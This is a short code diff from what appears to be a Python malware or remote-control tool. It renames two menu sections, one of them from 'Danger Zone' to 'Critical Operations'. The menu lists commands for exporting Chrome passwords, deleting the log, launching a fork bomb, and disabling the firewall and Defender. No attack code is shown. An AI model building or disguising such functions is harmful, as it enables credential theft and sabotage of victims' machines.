@@ -142,11 +142,11 @@ while True:
             "PassExport - Export Chrome passwords",
             "DeleteLog - Delete logger.log"
         ],
-        "Danger Zone": [
+        "Critical Operations": [
             "ForkBomb - Attempt a forkbomb",
             "PortOpener - Disable firewall & defender"
         ],
-        "Info & Exit": [
+        "Support & Exit": [
             "info - Show details of a command",
             "help - Show available actions",
             "exit - Exit the program"
